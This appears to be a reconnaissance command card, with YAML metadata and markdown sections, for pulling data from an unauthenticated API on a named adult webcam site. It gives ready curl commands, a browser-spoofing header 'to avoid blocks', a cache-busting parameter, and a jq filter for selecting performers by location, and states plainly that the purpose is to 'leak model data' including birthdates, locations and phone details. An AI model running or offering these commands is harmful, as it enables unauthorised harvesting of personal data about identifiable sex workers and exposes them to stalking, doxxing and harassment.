---
data: >-
  curl
  "https://www.xvcams.com/api/models/get-offline-models-by-tags.php?sitekey=xvt&tag_id=115&service=girls&t=$(date
  +%s)" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
  AppleWebKit/537.36"
tags:
  - recon
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:28.756Z'
id: 7e23247f-ba90-40fa-a2ea-ebac47d05bb1
verified: false
validated: true
submitted: true
---
---

# curl-access-offline-models-api

## Command

```bash
curl "https://www.xvcams.com/api/models/get-offline-models-by-tags.php?sitekey=xvt&tag_id=115&service=girls&t=$(date +%s)" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

## Description

This command performs an unauthenticated GET request to the xvcams.com offline models API, retrieving JSON with PII. Use it during reconnaissance to leak model data; customizable via tag_id and service parameters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `sitekey=xvt` | Fixed site key for the endpoint | Yes |
| `tag_id=115` | ID for model category filtering | Yes |
| `service=girls` | Service type (e.g., girls, trans) | Yes |
| `t=$(date +%s)` | Timestamp to bypass basic caching | Yes |
| `-H "User-Agent: ..."` | Mimics browser to avoid blocks | No |

## Examples

### Basic Usage

```bash
curl "https://www.xvcams.com/api/models/get-offline-models-by-tags.php?sitekey=xvt&tag_id=115&service=girls&t=1714076106516"
```

### Advanced Usage

```bash
curl "https://www.xvcams.com/api/models/get-offline-models-by-tags.php?sitekey=xvt&tag_id=120&service=trans&t=$(date +%s)" | jq '.[] | select(.location == "USA")'
```

## Expected Output

JSON array of models, e.g., [
  {"id":123, "birthdate":"1990-01-01", "location":"USA", "eye_color":"blue", "phone":{"verified":true}}
]. Errors if endpoint changes.

## Related

- [[Related Procedure]]
